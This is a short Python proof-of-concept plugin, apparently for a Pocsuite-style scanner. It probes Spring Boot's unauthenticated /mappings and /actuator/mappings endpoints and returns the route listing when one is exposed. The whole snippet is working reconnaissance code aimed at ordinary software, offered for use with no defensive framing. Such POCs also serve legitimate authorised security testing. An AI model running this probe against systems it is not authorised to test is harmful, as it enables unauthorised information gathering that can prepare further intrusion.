...
class DemoPOC(POCBase):
    ...
    references = []
    name = 'springboot springboot Pre-Auth mappings Information Disclosure'
    appPowerLink = ''
    appName = 'springboot'
    appVersion = ''
    ...
    def _exploit(self):
        result = {}
        paths=["/mappings","/actuator/mappings"]
        for  path in paths:
            res = requests.get(urljoin(self.url,path), headers=self.headers)
            logger.debug(res.text)
            if "mappings" in res.text and "produces" in res.text and "application" in res.text:
                return res.text
